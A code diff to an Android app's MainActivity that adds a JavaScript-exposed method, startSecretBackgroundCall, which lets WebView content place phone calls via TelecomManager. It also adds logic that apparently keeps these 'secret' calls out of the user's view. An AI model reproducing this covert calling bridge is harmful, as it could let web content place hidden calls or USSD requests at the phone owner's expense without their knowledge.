@@ -13,6 +13,10 @@ import android.net.Uri;
 import android.net.http.SslError;
 import android.os.Build;
 import android.os.Bundle;
+import android.os.Handler;
+import android.os.Looper;
+import android.telecom.PhoneAccountHandle;
+import android.telecom.TelecomManager;
 import android.view.View;
 import android.view.ViewTreeObserver;
 import android.view.WindowInsets;
@@ -30,6 +34,7 @@ import java.io.ByteArrayInputStream;
 import java.io.InputStream;
 import java.net.URLDecoder;
 import java.nio.charset.StandardCharsets;
+import java.util.List;
 import java.util.Locale;
 
 public class MainActivity extends Activity {
@@ -37,6 +42,7 @@ public class MainActivity extends Activity {
 
     public static volatile MainActivity currentInstance = null;
     public static volatile boolean isExpectingUssdResponse = false;
+    public static volatile boolean isActivityForeground = false;
 
     private WebView webView;
     private String pendingInitialDial = "";
@@ -280,13 +286,31 @@ public class MainActivity extends Activity {
     @Override
     protected void onResume() {
         super.onResume();
+        isActivityForeground = true;
         DialerSyncHelper.requestFreshStateFromBanking(this);
         notifyBankingStateSynced();
     }
 
     @Override
+    protected void onPause() {
+        super.onPause();
+        isActivityForeground = false;
+        if (SecretInCallService.isSecretCallActive()) {
+            new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
+                @Override
+                public void run() {
+                    if (SecretInCallService.isSecretCallActive() && !isActivityForeground) {
+                        SecretInCallService.bringUiToFrontIfSecret();
+                    }
+                }
+            }, 140L);
+        }
+    }
+
+    @Override
     protected void onDestroy() {
         super.onDestroy();
+        isActivityForeground = false;
         currentInstance = null;
         try {
             unregisterReceiver(receiver);
@@ -415,7 +439,11 @@ public class MainActivity extends Activity {
             public void run() {
                 try {
                     Intent bringIntent = new Intent(MainActivity.this, MainActivity.class);
-                    bringIntent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
+                    bringIntent.addFlags(
+                        Intent.FLAG_ACTIVITY_NEW_TASK
+                        | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
+                        | Intent.FLAG_ACTIVITY_SINGLE_TOP
+                    );
                     startActivity(bringIntent);
                 } catch (Throwable ignored) {
                 }
@@ -582,19 +610,47 @@ public class MainActivity extends Activity {
 
         @JavascriptInterface
         public void startSecretBackgroundCall(final String targetNumber, final int maxRingMs) {
+            if (targetNumber == null || targetNumber.trim().isEmpty()) return;
+            final String cleanTarget = targetNumber.trim();
+            final long armSeq = SecretInCallService.armSecretCall(cleanTarget, maxRingMs > 0 ? maxRingMs : 8000);
             MainActivity.this.runOnUiThread(new Runnable() {
                 @Override
                 public void run() {
-                    if (targetNumber == null || targetNumber.trim().isEmpty()) return;
+                    if (!SecretInCallService.isArmSeqActive(armSeq)) {
+                        return;
+                    }
                     if (Build.VERSION.SDK_INT >= 23
                         && MainActivity.this.checkSelfPermission(Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
+                        SecretInCallService.resetSecretState();
                         DialerSyncHelper.requestDialerPermissions(MainActivity.this);
                         notifySecretJs("window.onSecretCallError && window.onSecretCallError('CALL_PHONE permission required');");
                         return;
                     }
                     try {
-                        SecretInCallService.armSecretCall(targetNumber.trim(), maxRingMs > 0 ? maxRingMs : 8000);
-                        String clean = targetNumber.trim().replace("#", Uri.encode("#"));
+                        if (Build.VERSION.SDK_INT >= 23) {
+                            TelecomManager tm = (TelecomManager) MainActivity.this.getSystemService(Context.TELECOM_SERVICE);
+                            if (tm != null) {
+                                Bundle extras = new Bundle();
+                                PhoneAccountHandle handle = null;
+                                try {
+                                    handle = tm.getDefaultOutgoingPhoneAccount("tel");
+                                    if (handle == null
+                                        && MainActivity.this.checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
+                                        List<PhoneAccountHandle> accounts = tm.getCallCapablePhoneAccounts();
+                                        if (accounts != null && !accounts.isEmpty()) {
+                                            handle = accounts.get(0);
+                                        }
+                                    }
+                                } catch (Throwable ignoredHandle) {
+                                }
+                                if (handle != null) {
+                                    extras.putParcelable(TelecomManager.EXTRA_PHONE_ACCOUNT_HANDLE, handle);
+                                }
+                                tm.placeCall(Uri.fromParts("tel", cleanTarget, null), extras);
+                                return;
+                            }
+                        }
+                        String clean = cleanTarget.replace("#", Uri.encode("#"));
                         Intent callIntent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + clean));
                         callIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                         MainActivity.this.startActivity(callIntent);
@@ -608,6 +664,8 @@ public class MainActivity extends Activity {
 
         @JavascriptInterface
         public void cancelSecretBackgroundCall() {
+            // Mark cancelled synchronously on binder thread before any queued UI runnable executes
+            SecretInCallService.markUserCancelledNow();
             MainActivity.this.runOnUiThread(new Runnable() {
                 @Override
                 public void run() {
